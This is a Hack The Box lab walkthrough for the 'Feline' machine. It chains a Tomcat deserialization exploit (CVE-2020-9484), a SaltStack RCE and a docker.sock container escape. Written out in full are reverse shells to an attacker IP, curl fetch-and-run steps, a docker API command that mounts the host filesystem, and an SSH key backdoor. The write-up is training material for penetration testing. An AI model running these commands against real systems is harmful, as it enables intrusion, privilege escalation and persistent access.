---
layout: single
title: Feline Walkthrough - Hack The Box
excerpt: "Feline is a Hack the Box machine that is rated Hard on their difficulty scale. This machine will be a challenge for many and will require attention to detail and likely a lot of research. We will start by finding out that there is an Apache Tomcat 9.0.27 deployment running that is hosting a site that allows for uploading files. We then find that the machine is vulnerable to CVE-2020-9484 – a vulnerability with insecure deserialization that when paired with Apache PersistenceManager can result in remote code execution. We are then able to get our initial shell and find that the machine is using a stool called SaltStack that is also vulnerable to RCE. This allows us to get a shell as the root user on a container that is hosted by the machine. The host allows for containers to utilize the Docker.Sock Unix socket, and we are able to breakout of the container using the Docker API."
classes: wide
header:
  teaser: /assets/images/htb-feline/feline_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - Hack the Box
  - Linux
tags:  
  - Hack the Box
  - Linux
  - Burp Suite
  - Tomcat 9.0.27
  - CVE-2020-9484
  - CVE-2020-11651
  - SaltStack
  - Docker
  - Chisel
---

![](/assets/images/htb-feline/feline_logo.png)

## Summary
Feline is a [Hack the Box](https://hackthebox.eu) machine that is rated Hard on their difficulty scale. This machine will be a challenge for many and will require attention to detail and likely a lot of research. We will start by finding out that there is an Apache Tomcat 9.0.27 deployment running that is hosting a site that allows for uploading files. We then find that the machine is vulnerable to CVE-2020-9484 – a vulnerability with insecure deserialization that when paired with Apache PersistenceManager can result in remote code execution. We are then able to get our initial shell and find that the machine is using a stool called SaltStack that is also vulnerable to RCE. This allows us to get a shell as the root user on a container that is hosted by the machine. The host allows for containers to utilize the Docker.Sock Unix socket, and we are able to breakout of the container using the Docker API.

## Port Scan
We'll start by scanning for open TCP ports using the following nmap command.

``` bash
nmap -sCTV -Pn -T4 -p- -oA nmap_all_tcp 10.10.10.205
```

![](/assets/images/htb-feline/01_feline_nmap_scan.png)

Our scan shows us that OpenSSH 8.2p1 is running on port 22 and that there is an Apache Tomcat 9.0.27 service running on port 8080. We should first go take a look at what is being served by the Tomcat service on port 8080.

## Website - VirusBucket
When we navigate to `http://10.10.10.205:8080` in our browser we find a website named `VirusBucket`. The site appears to be providing a malware analysis service.

![](/assets/images/htb-feline/02_feline_website_home.png)

The website and its links are largely nonfunctioning. However, there is another page found when we take the `Service` link from the top navigation. This leads to `http://10.10.10.205:8080/service/` and appears to allow us to `upload a file` to be analyzed.

![](/assets/images/htb-feline/03_feline_website_service.png)

This upload functionality may be our initial entry point. Considering the functionality is meant to allow for the uploading of malware, it may mean that we will be able to upload just about anything, including a reverse shell payload. We should try testing the upload functionality while analyzing the requests with Burp Suite. Before we do though, we should also start a fuzzing job to see if there are any other files or directories that we are not seeing here.

## Directory Fuzzing with GoBuster
Before we continue to look into the websites upload functionality, we should get a fuzzer running in the background. We know that the site is being hosted by a Tomcat server. Tomcat is commonly associated to a Java based web application, and `.jsp` files are something that we should look for in our fuzz. We can run the following GoBuster command to do a directory search on the site, passing the `-x` flag with `jsp,txt` as an argument and gobuster will also fuzz for jsp and txt files.

``` bash
gobuster dir -u http://10.10.10.205:8080 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 25 -x jsp,txt
```

![](/assets/images/htb-feline/04_feline_gobuster.png)

GoBuster will take some time to run, and so while it is running, we will begin to play with the upload functionality with Burp.

##### Final GoBuster Results
``` bash
===============================================================
2021/01/19 15:12:29 Starting gobuster
===============================================================
/images (Status: 302)
/upload.jsp (Status: 200)
/service (Status: 302)
/license.txt (Status: 200)
===============================================================
2021/01/19 15:26:34 Finished
===============================================================
```

>**NOTE:** GoBuster ultimately doesn’t show us any information that we will not get from the following Burp Suite analysis. But anytime we can have some background enumeration happening while we work on something else, we should be doing it. This could have resulted in additional information.

## Testing Upload Functionality with Burp Suite
We are going to start by using the `Burp Suite` proxy to catch the upload request so that we can review what it is doing before sending it to the server. Open Burp Suite and confirm that `Intercept` is turned on from the `Proxy` tab.

![](/assets/images/htb-feline/05_feline_burp_intercept_on.png)

>**NOTE:** You will need to configure your browser to send all requests to your Burp Suite proxy. If you are unfamiliar with how to do this, you can visit [this page.](https://portswigger.net/burp/documentation/desktop/getting-started/proxy-setup/browser) I recommend using the FireFox browser plugin named 'Foxy Proxy' to handle this easily.

Now with intercept on, we will upload a text file (I named mine test.txt) with anything in it. When we click the `Analyze!` button, Burp Suite will catch the request.

![](/assets/images/htb-feline/06_feline_burp_upload_post.png)

We see here that the upload is handled with a generic POST request sent to `upload.jsp`. And so now we know for sure that this is running some form of a Java based application. We should play with the request in `Repeater` to see if it is actually uploading a file, and if so where it is putting the file.

Send the request to Repeater by pushing `Ctrl+R` while on the intercepted request page. Go to the Repeater tab and go ahead and send the request.

![](/assets/images/htb-feline/07_feline_burp_repeater_success.png)

It appears that the upload functionality does actually upload something, or at least it is made to seem that way. The `File uploaded successfully!` message is indication of that, but it does not necessarily help us understand what will happen to our uploaded file. It would have been nice if it included the upload location in the message. 

One way that we may be able to get a message that exposes the upload location is by trying things that would produce an error. If the application is not coded in a way that securely handles errors, it may result in information disclosure. 

To do this, we try things like... 
* Resubmitting the same request. This may cause an error if it doesn’t know how to handle a file with the same name.
* Removing parts of the Post request that are likely to be required. Such as the name, filename, or even the content of the file.

![](/assets/images/htb-feline/08_feline_burp_repeater_error.png)

Sweet! What works for us is to remove the value of `filename`. This results in an error saying that `/opt/samples/uploads (Is a directory)`. This is likely because the application is coded in a way that is trying to save the file by providing its fully qualified path & file name, for example /opt/samples/uploads/test.txt. Because the string used as the file name was a directory, it caused an error. This results in the upload directory being exposed.

##### Upload Directory
```
/opt/samples/uploads
```

This isn't all good new though. This means that the uploaded files are being sent to a directory that is likely not served by the Apache server. This means that even if we were to get a shell payload file uploaded, we would not be able to execute it without some kind of RCE and with an RCE would wouldn’t even need the upload. Our GoBuster scan has finished and does not expose any other pages or directories and so we likely will not find an RCE in the website. And so, it is time to take a step back and consider the information that we have at this point that my lead to a path forward.

## Apache Tomcat 9.0.27 Vulnerability - CVE-2020-9484
At this point we know that there are only two ports open, serving SSH and an Apache Tomcat deployment. We know that the site allows for us to upload files, but the files are uploaded to a directory that we cannot access directly from the pages served by the Apache server. At this point, we should start researching vulnerabilities with the versions of the services that are open. The Apache Tomcat server is more likely to have vulnerabilities than the SSH service, and so we should start there.

A Google search for `Apache Tomcat 9.0.27 Vulnerability` results in us finding out that there is a [Remote Code Execution](https://www.cybersecurity-help.cz/vdb/SB2020052124) vulnerability in this version of Apache Tomcat.

##### CVE-2020-9484 Description
```
The vulnerability allows a remote attacker to execute arbitrary code on the target system.

The vulnerability exists due to insecure input validation when processing serialized data in uploaded files names. A remote attacker can pass specially crafted file name to the application and execute arbitrary code on the target system.

Successful exploitation of this vulnerability may result in complete compromise of vulnerable system but requires that the server is configured to use PersistenceManager with a FileStore and the attacker knows relative file path from storage location.
```

It seems that this vulnerability will require some very specific conditions.
* The server must be configured to use the PersistenceManager
* There must be an upload functionality where the attacker can control the uploaded file name.
* The attacker must know the path of the upload storage location.

We do not know at this point if the server is configured to use the PersistenceManager. However, we do know that all of the other conditions are true. And considering this is a capture the flag, the simple fact that this machine is on this specific version of Tomcat and we know that the requirements around the uploading are all met, we should spend some time figuring out how to exploit this vulnerability.

A Google search of `CVE-2020-9484 exploit` leads us to [this post](https://www.redtimmy.com/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/) that may help us better understand how we can exploit this vulnerability.

After reading this page, the vulnerability seems pretty straight forward. 
- The `PresistenceManager` will first attempt to look for a session in memory, and if it does not find it, it will attempt to look for it on the hard disk.
- We have access to change the name of the session and can set it to a path on the hard drive, for example our upload directory.
- When the the session ID check is made, it will search for it in the form of {SESSION_DIRECTORY}{SESSION_ID}.session.
    - For example, if we set our session ID to `../../../opt/samples/uploads/idiothacker` and we had a serialized payload named `idiothacker.session` uploaded to the uploads directory, our payload should be executed apon the page request.

>**NOTE:** I spent about two hours trying to do this next step, passing many different payloads in a single one-liner to try to get a shell. It seemed that everything that I threw at it would not work. Until I tried it the way that we will do it here. If you were able to do this more effeciantly, I'd love to hear how you did it.

## Exploiting CVE-2020-9484 (User Flag)

Preparing for this exploit will involve a few steps.
1. Creating a very basic bash script named `connect.sh` that simply sends a shell request to our machine.
1. Creating a file named `get.session` that will contain a prepared payload that uses curl to download the connect.sh script.
1. Creating a file named `run.session` that contains a payload that runs the connect.sh script.
1. Uploading the get.session and the run.session to the server using the sites built in functionality.
1. Start a webserver that will serve the connect.sh script.
1. Use curl to send a request to the uploads.jsp page, passing the location of get.session as the JSESSIONID.
1. Start an nc listerner on port 443.
1. Use curl to send a request to the uploads.jsp page, passing the location of run.session as the JSESSIONID.

Let's start by creating a file named `connect.sh` in our working directory with the following script. Be sure to replace `<YOUR TUNNEL IP>` with your HTB VPN IP.

``` bash
#! /bin/bash
bash -c "bash -i >& /dev/tcp/<YOUR TUNNEL IP>/443 0>&1"
```

Now we will need to go download a tool called [ysoserial](https://github.com/frohoff/ysoserial). Visit the GitHub page and scroll down to the `Installation` section and just download the jar file for JitPack. Once you have downloaded the jar file, move it to your working directory and then run it using the following command. Be sure to replace `<YOUR TUNNEL IP>` with your HTB VPN IP.

``` bash
java -jar ysoserial-master-138dc36bd2-1.jar CommonsCollections2 'curl http://<YOUR TUNNEL ID>/connect.sh -o /tmp/connect.sh' > get.session
```

![](/assets/images/htb-feline/09_feline_get.session.png)

> **NOTE:** The name of the jar file make be different when you download it. If that is the case, be sure to modify the name of the jar file in the command.

This will create a file in our working directory named `get.session` that has a java serialized payload that will run the curl command to download the connect.sh file from our machine and store it in the `/tmp` directory on the target.

Next we will do the same, this time with the command to run the script and saving it in a file named `run.session`.

``` bash
java -jar ysoserial-master-138dc36bd2-1.jar CommonsCollections2 'bash /tmp/connect.sh' > run.session
```

![](/assets/images/htb-feline/10_feline_run.session.png)

Now upload both the `get.session` and `run.session` files using the sample analysis upload functionality on the site. And then the fun part starts!

>**NOTE:** There seems to be a job on the server that will regularly clear the files added to the uploads directory. If at some point the steps bellow are not working, first try to reupload your session files.

From your working directory, run the following command to start a python web server in your wokring directory.

``` bash
python3 -m http.server 80
```

And now run the following curl command to pass the `get.session` file that we uploaded as the session ID.

``` bash
curl http://10.10.10.205:8080/upload.jsp -H 'Cookie:JSESSIONID=../../../opt/samples/uploads/get'
```

![](/assets/images/htb-feline/11_feline_get.session_curl.png)

Don't be alarmed by the error, we should expect this, because what happed was that it found our session (the get.session payload), and then tried to use it. But out session simply told the machine to curl back to our attacking machine to get the connect.sh and then save it in /tmp. We can confirm this by seeing that our python web server received the request.

![](/assets/images/htb-feline/12_feline_get.session_download.png)

Now we need to start a Netcat listener on port 443.

``` bash
nc -lvnp 443
```

And finally we can run the following curl command to send a request, passing the run.session as the session ID.

``` bash
curl http://10.10.10.205:8080/upload.jsp -H 'Cookie:JSESSIONID=../../../opt/samples/uploads/run'
```

Once again, do not be alarmed if you receive and error. You can confirm this worked by seeing that you should now have a reverse shell as the `tomcat` user.

![](/assets/images/htb-feline/13_feline_user_flag.png)

Awesome! We now have a shell as the tomcat user, who has access to the `user.txt` found at `/home/tomcat/user.txt`. Now it is time to look for a path to privilege escalation.

## Finding a Path to Escalation of Privilege
As a typical EoP investigation, we will run the [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) script.

Download the LinPEAS script and move it to your working directory. After you have moved it, start the Python web server again, using the same command from above. You can then curl for it and just pipe it directly into bash with the following command.

``` bash
curl http://<YOUR TUNNEL IP>/linpeas.sh | bash
```

 As expected, considering the Hard rating of this machine, there are not a bunch of things jumping out in the results of this script. One thing that it does show us is that there are a number of ports running internally. 

 ![](/assets/images/htb-feline/14_feline_linpeas.png)

 We could also have seen the same information by having run the following command.

 ``` bash
 netstat -tulpn
 ```

 Not knowing what some of the ports are used for, we can do some Google searching on the ports. This leads to us finding out that there may be a tool called `Salt` installed on the machine. Many pages, such as [this one](https://docs.saltproject.io/en/getstarted/system/communication.html) list Salt as using both ports `4505` and `4506`, and we can see that both of these ports are running internally on this machine.

When searching for `SaltStack exploit` we find [this page](https://www.trendmicro.com/vinfo/us/security/news/vulnerabilities-and-exploits/coinminers-exploit-saltstack-vulnerabilities-cve-2020-11651-and-cve-2020-11652) where we learn about two very recent vulnerabilities with the SaltStack application that allows for authentication bypass (`CVE-2020-11651`) and directory traversal (`CVE-2020-11652`).

When searching for `CVE-2020-11651 exploit`, we find that someone has created [this python script](https://github.com/jasperla/CVE-2020-11651-poc) that will allow for command execution and file reading as the root user by taking advantage of this vulnerability.

Python3 is installed on the machine and so we can try to just move the script to the machine, or create it on the machine. However, when we try to use it, we are presented with an error letting us know that the `salt library` cannot be found. An option to get around this will be to simply move [chisel](https://github.com/jpillora/chisel) to the machine and then to setup a tunnel for our attacking machine to run the script.

## Port Forwarding and Attacking SaltStack
If you do not already have chisel install on your kali machine, follow the instructions found on the [github page](https://github.com/jpillora/chisel). It is as simple as using their curl one-liner if you trust a curl to bash script.

The installation should result in the binaries being installed in `/usr/local/bin/chisel`. Copy the chisel binary from this location to your working directory and start your python web server from your working directory. We can now copy chisel to the target machine using the following command.

``` bash
curl http://<YOUR TUNNEL IP>/chisel -o /opt/tomcat/work/chisel
```

 ![](/assets/images/htb-feline/15_feline_chisel_upload.png)

 >**NOTE:** This directory may seem like a strange and random location to put the chisel binaries. I've chosen this because the tomcat user has limited access to write in the file system. Not even in the user's /home directory. When trying to write this file to /tmp it works, but it will quickly be removed as there appears to be a job clearing out tmp, similar to the one cleaning the site uploads directory. And so, I was left with finding a folder location where I could write the file.

 You will also need to make the chisel binaries executable by running the following command.

 ``` bash
chmod +x /opt/tomcat/work/chisel 
 ```

Now from our attacking machine, we will start a chisel reverse tunnel on port 8008 by using the following command.

``` bash
chisel server -p 8008 --reverse
```

![](/assets/images/htb-feline/16_feline_chisel_reverse_start.png)

In line 293 of the exploit script, we see that it will target port `4506`. We are now going to connect to our reverse tunnel listener and forward port 4506 through the tunnel. On the target machine shell, run the following command.

``` bash
/opt/tomcat/work/chisel client <YOUR TUNNEL IP>:8008 R:4506:127.0.0.1:4506
```

![](/assets/images/htb-feline/17_feline_chisel_connect.png)

We can now test the script by running it from our attacking machine using the following command.

``` bash
python3 exploit.py --master 127.0.0.1 -r /etc/passwd
```

![](/assets/images/htb-feline/18_feline_salt_exploit_test.png)

Sweet! It appears that this is indeed going to work for us. The script sends the request to port 4506 on our machine and then chisel sends it through the tunnel where it is sent to the Salt service and successfully gets command execution.

As this is a capture the flag, your first thought might to be to take this RCE and to cat out the root.txt. However, we will not be able to do that, as it will not find it. And so we should work on getting a shell to find out why. We should be able to do this by starting another netcat listener and then using this exploit to run the same shell request command that we used earlier to get a shell as the tomcat user.

Let's start a netcat listener on port 9001.

``` bash
nc -lvnp 9001
```

Now run the exploit with the following command to execute the reverse shell request on the machine.

``` bash
python3 exploit.py --master 127.0.0.1 --exec 'bash -c "bash -i >& /dev/tcp/<YOUR TUNNEL IP>/9001 0>&1"'
```

![](/assets/images/htb-feline/19_feline_salt_exploit_shell.png)

This should result in our listener receiving a reverse shell request from the target machine.

![](/assets/images/htb-feline/20_feline_salt_exploit_shell_connect.png)

Awesome! We are now root on the machine! Or are we? When looking for the root.txt, we do not find it in the root user's home directory.

![](/assets/images/htb-feline/21_feline_root_home.png)

It would seem that we will have some work to do....

## What the heck is this? Where is my flag!?!?
We do not have a flag yet... and that is disappointing sure. But what we do have are a few clues in the root users home directory that might help us understand what is going on. First, we have a file named `todo.txt` and when we cat it out, we get the following.

```
- Add saltstack support to auto-spawn sandbox dockers through events.
- Integrate changes to tomcat and make the service open to public.
```

Second, we see that the root user's bash history (`.bash_history`) is not empty. When we cat it out we get the following.

``` bash
paswd
passwd
passwd
passswd
passwd
passwd
cd /root
ls
ls -la
rm .wget-hsts 
cd .ssh/
ls
cd ..
printf '- Add saltstack support to auto-spawn sandbox dockers.\n- Integrate changes to tomcat and make the service open to public.' > todo.txt
cat todo.txt 
printf -- '- Add saltstack support to auto-spawn sandbox dockers.\n- Integrate changes to tomcat and make the service open to public.' > todo.txt
cat todo.txt 
printf -- '- Add saltstack support to auto-spawn sandbox dockers.\n- Integrate changes to tomcat and make the service open to public.\' > todo.txt
printf -- '- Add saltstack support to auto-spawn sandbox dockers.\n- Integrate changes to tomcat and make the service open to public.\n' > todo.txt
printf -- '- Add saltstack support to auto-spawn sandbox dockers.\n- Integrate changes to tomcat and make the service open to public.\' > todo.txt
printf -- '- Add saltstack support to auto-spawn sandbox dockers.\n- Integrate changes to tomcat and make the service open to public.\n' > todo.txt
cat todo.txt 
printf -- '- Add saltstack support to auto-spawn sandbox dockers through events.\n- Integrate changes to tomcat and make the service open to public.\n' > todo.txt
cd /home/tomcat
cat /etc/passwd
exit
cd /root/
ls
cat todo.txt 
ls -la /var/run/
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
exit
```

Based on the combination of these two things, and the name (this machine is named `2d24bf61767c` the name of the machine with the tomcat user was `VirusBucket`) of the machine we are connected to, it is fair to guess that what we are now connected to is a docker container. This means that our root flag is probably on the machine that is hosting this docker container. It also means that we are going to need to find a way to break out of the container.

## Breaking Out of Docker
When we looked at the root user's bash history, we see that a command was run that was using the `docker.socket`. When we run the some command, we recive some JSON that appears to be details about Docker container images on the machine.

``` bash
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
```

``` json
[{
	"Containers":-1,
	"Created":1590787186,
	"Id":"sha256:a24bb4013296f61e89ba57005a7b3e52274d8edd3ae2077d04395f806b63d83e",
	"Labels":null,
	"ParentId":"",
	"RepoDigests":null,
	"RepoTags":["sandbox:latest"],
	"SharedSize":-1,
	"Size":5574537,
	"VirtualSize":5574537
},
{
	"Containers":-1,
	"Created":1588544489,
	"Id":"sha256:188a2704d8b01d4591334d8b5ed86892f56bfe1c68bee828edc2998fb015b9e9",
	"Labels":null,
	"ParentId":"",
	"RepoDigests":["<none>@<none>"],
	"RepoTags":["<none>:<none>"],
	"SharedSize":-1,
	"Size":1056679100,
	"VirtualSize":1056679100
}]
```

When we Google `docker.sock` we are brought to [this page](https://medium.com/better-programming/about-var-run-docker-sock-3bfd276e12fd) where we learn that docker.sock is a Unix socket that the Docker daemon listens on by default. This allows the Docker service and its API to be accessible from within a container. The significance of this is that we have access to it and we may be able to use it as a way to break out of the container.

When searching for `docker.sock exploits` we find [this page](https://dejandayoff.com/the-danger-of-exposing-docker.sock/) and [this page](https://securityboulevard.com/2019/02/abusing-docker-api-socket/) that both show multiple ways to manually abuse this.

We also find that there is a [Golang program called](https://github.com/brompwnie/ed) `ed` that can identify exposed Unix sockets, and then attempt to auto exploit them to get a shell on the host. However, after compiling it and attempting to use it on this container, it was only able to confirm that the socket is valid, and could not auto exploit it.

We are going to try to exploit this manually. Based on the articles listed above, we may be able to create a new instance of a container, giving it escalated privilege and mounting the host file system to it. We can then run commands against the new container instance, and the host file system. Being able to do this should allow us to access the root flag, and even get a shell on the host system by injecting a public ssh key into the host root account's authorized_keys and then connecting to the host over SSH. This may all seem complicating at the moment, but we will get through it!

>**NOTE:** If you're like me and new to the Docker Engine API, you may need to spend some time in their [documentation](https://docs.docker.com/engine/api/v1.24/) to completely understand what we will be doing here.

First, let's start a new netcat listener on port 9002 from our attacking machine.

``` bash
nc -lvnp 9002
```

This listener will catch a shell request that will be made when we start the container that we are going to create. 

We know based on the JSON that returned in the results above that there is an image name `sandbox`. And so, we can create a container pointing to that image. We can also attach the hosts file system and then also force the machine start to send a reverse shell request to our listener. We can create a container named `idiot` by running the following command in our current container shell.

>**NOTE:** This is a long and terrible command, I know. But read it carefully and replace the `<YOUR TUNNEL IP>` with your VPN IP. You can also change the name of the container if you would prefer. 

``` bash
curl -s -X POST --unix-socket /var/run/docker.sock -d "{ \"Image\": \"sandbox\", \"cmd\": [\"/bin/sh\",\"-c\",\"chroot /tmp sh -c \\\"bash -c 'bash -i >& /dev/tcp/<YOUR TUNNEL IP>/9002 0>&1'\\\"\"], \"Binds\": [\"/:/tmp:rw\"] }" -H 'Content-Type: application/json' http://localhost/containers/create?name=idiot
```

![](/assets/images/htb-feline/22_feline_docker_create.png)

This will result in a container named `idiot`. Now with our listener running on port 9002 we just need to run the following command to start the new container.

``` bash
curl -s -X POST --unix-socket /var/run/docker.sock "http://localhost/containers/idiot/start"
```

![](/assets/images/htb-feline/23_feline_docker_start.png)

And this should result in a new connection to a new container that has access to the host file system, and that can cat out the root flag!

![](/assets/images/htb-feline/24_feline_root_flag.png)

Awesome! We now have both the user and the root flags!

## Bonus - SSH to Root on Host (VirusBucket)
For the sake of capture the flag, stopping here would be just fine. However, I do capture the flags to practice penetration testing. The goal in a penetration test isn’t to collect flags. We are looking for shells at a privileged user. And so, we do not need to stop here.

At this point we have access to the host file system, and we can even write to it using our created container. We also know that SSH is running on port 22 on the host machine. A great approach at this point to get a shell as the root user of the host machine would be to try to generate an ssh key pair, push the generated public key into `/root/.ssh/authorized_keys` and then to try to ssh to the host machine, passing it our generated private key.

First just generate a key pair using the `ssh-keygen` command. I will name it `key` and save it in my working directory without adding a password.

![](/assets/images/htb-feline/19_feline_keygen.png)

This will result in two files, `key` and `key.pub`. Cat out the key.pub as we will use it in the next command.

Now, from our shell that is connected to our created container, we just need to run the following command to echo the contents of the `key.pub` into the root users authorized_keys file.

``` bash
echo "<YOUR KEY.PUB>" >> /root/.ssh/authorized_keys
```

![](/assets/images/htb-feline/25_feline_root_key_pub.png)

We should now be able to SSH to the machine as the root user without being promped for a password by passing the ssh command the privaite side of the key pair in the `-i` flag.

``` bash
ssh -i key root@10.10.10.205
```

![](/assets/images/htb-feline/26_feline_root_ssh.png)

Success! Complete machine ownership!

## Conclusion
Feline was one of my favorite machines yet. It was both very frustrating at times and also super informative. I found this to be a great challenge as I knew very little about each of the attack vectors. It took me the better part of 1.5 days to get this machine. I spent significantly more time researching than I did actually exploiting. Overall, it was just loaded with lessons for me, and I always appreciate learning new skills and technologies while working on a CTF machine.

If you felt my walkthrough helped you, please take a couple of seconds to visit my [HTB Profile](https://www.hackthebox.eu/home/users/profile/271618) and tap that respect button. Also, if you would like to receive a notice of new walkthroughs being posted, follow me on [Twitter](https://twitter.com/IdiotHackerEB). If you have any questions or run into any problems as you walk through this, please feel free to reach out to me on Twitter or Discord (idiothacker). Have fun hacking!